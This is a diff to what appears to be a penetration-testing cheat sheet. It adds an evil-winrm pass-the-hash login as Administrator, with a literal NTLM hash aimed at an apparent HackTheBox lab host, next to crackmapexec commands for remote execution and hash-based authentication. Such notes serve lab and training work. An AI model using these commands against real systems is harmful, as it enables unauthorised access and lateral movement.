@@ -1975,6 +1975,7 @@ crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executi
 
 #Pass the hash
 crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
+evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
 #We can run all the above commands with hash and obtain more information
 
 #crackmapexec modules
